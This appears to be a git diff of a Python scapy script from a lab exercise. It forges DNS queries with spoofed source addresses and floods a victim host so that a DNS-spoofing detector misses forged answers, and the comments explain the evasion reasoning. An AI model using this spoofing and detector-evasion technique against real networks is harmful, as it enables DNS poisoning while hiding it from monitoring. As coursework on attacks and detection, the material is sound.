@@ -15,9 +15,9 @@ from scapy.all import *
 # has more than one answer,and then compares both answers to make sure they're 
 # correct. However in this case, the query will only get one answer, and will
 # then be replaced by a different query which will also get one answer and so on...
-def create_IP_Packet(IP_src_dst):
+def create_IP_Packet(IP_src, IP_dst):
 
-    IPpacket = IP(src = IP_src_dst , dst = IP_src_dst)
+    IPpacket = IP(src = IP_src, dst = IP_dst)
     return IPpacket
 
 # In this function, we create the UDPpacket setting the destination port
@@ -35,9 +35,9 @@ def create_DNS_Packet(qname):
     return DNSpacket
 
 # Create the full request
-def create_request(IP_src_dst, qname):
+def create_request(IP_src, IP_dst, qname):
 
-    request = create_IP_Packet(IP_src_dst)/create_UDP_Packet()/create_DNS_Packet(qname)
+    request = create_IP_Packet(IP_src, IP_dst)/create_UDP_Packet()/create_DNS_Packet(qname)
     return request
 
 #############################################################################
@@ -56,8 +56,12 @@ def executeAvoidanceAttack():
 
         # here, the fake domain should not be the same as of the main attackv1.py, since if they were, then the attack's machine
         # will sniff these packets as if they are DNS queries sent by the victim
-        target = '10.9.0.5'
-        fakeDomain = '1.2.3.4'
+        # this part had the source and destination the same, but since the attack sniffs for DNS packets from the victim,
+        # then having their IP as source would mean that the attacker will sniff their own packets, and then send false
+        # DNS answers to the victim, which is not what we wanted. Thats why we set the source to any random IP
+        randomTarget = '9.9.9.9'
+        victim = '10.9.0.5'
+        fakeDomain = 'www.example.com'
 
         # we start the flooding of the victim with DNS queries so that the detection awaits an answer.
         # we reply to the main DNS query with the fake domain, and then the algorithm only sees one answer,
@@ -65,7 +69,7 @@ def executeAvoidanceAttack():
         # and the detection considers it a valid answer. No same query had two answers.
         # notice is issam's functions, how the source is set as the victim so that the detection sniffs those
         # packets and awaits an answer
-        forgedDNSQueryPacket = create_request(target, fakeDomain)
+        forgedDNSQueryPacket = create_request(randomTarget, victim, fakeDomain)
         send(forgedDNSQueryPacket)
 
         # after experimentation, we saw that having the split time between packets as 0.1 best, since the DNS
